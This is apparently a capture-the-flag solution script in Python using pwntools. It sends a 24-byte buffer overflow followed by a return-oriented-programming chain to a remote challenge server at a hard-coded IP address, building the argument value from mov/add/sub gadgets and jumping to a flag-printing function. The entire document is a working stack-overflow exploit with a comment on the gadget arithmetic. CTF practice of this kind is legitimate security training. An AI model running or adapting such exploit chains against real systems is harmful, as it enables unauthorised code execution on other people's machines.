from pwn import *

#p = process("./chall")
p = remote("146.19.212.156", 10004)
"""
I need pop rdi but don't exist, so I use this 401273 + 4 *40127b + 2 *40127f
40127b add edi, 3; ret;
401273: mov edi, 0; ret;
40127f: sub rdi, 2; ret;
"""
payload = b'a' * 24
payload += p64(0x401273)
payload += p64(0x40127b) * 4
payload += p64(0x40127f) * 2
payload += p64(0x4011dd) # address of function that give us the flag
p.sendline(payload)
p.interactive()